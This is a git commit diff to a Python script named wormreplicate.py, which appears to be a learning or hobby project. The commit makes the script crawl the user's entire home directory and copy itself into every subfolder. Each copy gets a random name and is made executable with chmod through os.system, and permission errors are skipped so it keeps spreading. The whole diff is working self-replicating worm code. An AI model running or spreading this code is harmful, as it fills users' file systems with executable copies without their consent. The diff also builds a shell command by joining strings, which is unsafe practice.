c7a02265b75baa1048887e89f578d70dd0b8c6ef
peytonrayne <51815710+peytonrayne@users.noreply.github.com>
2021-06-29 20:11:03 -0400

    Update wormreplicate.py
    added directory crawling with try/catch for error handling

--- wormreplicate.py
+++ wormreplicate.py
@@ -6,7 +6,7 @@ import getpass
 import random
 
 
-def replicate():
+def get_file_info():
 
 	#get the name of the current iteration of the worm
 	filename = os.path.basename(__file__)
@@ -17,11 +17,15 @@ def replicate():
 	#get the username of Linux user to know the home folder location
 	user = getpass.getuser()
 
+	return filename, location, user
+
+def replicate(filename, location, user, name):
+
 	#generate random string to differentiate files while testing
 	noise = str(random.random())
 
 	#set destination to the user's Documents folder
-	destination = "/home/"+user+"/Documents/"+"wormreplicate"+noise+".py"
+	destination = "/home/"+user+"/"+name+"/"+"wormreplicate"+noise+".py"
 
 	#Copies our file into the new location
 	copyfile(location,destination)
@@ -31,19 +35,26 @@ def replicate():
 
 def make_executable(destination):
 
-	#sets the target for permission changes to be the newly created file
-	target = destination
-
 	#sets a command to make a file executable	
 	cmd = "chmod +x" + " " + destination
 
 	#run the command
 	os.system(cmd)
+	
 
 def main():
-	destination = replicate()
-	make_executable(destination)
+	filename, location, user = get_file_info()
+	for root, dirs, files in os.walk("/home/"+user+"/"):
+			for name in dirs:
+				print(name)
+				try:
+					destination = replicate(filename, location, user, name)
+					make_executable(destination)
+					print(destination)
+				except PermissionError:
+					continue
 
 
 if __name__ == "__main__":
 	main()
+
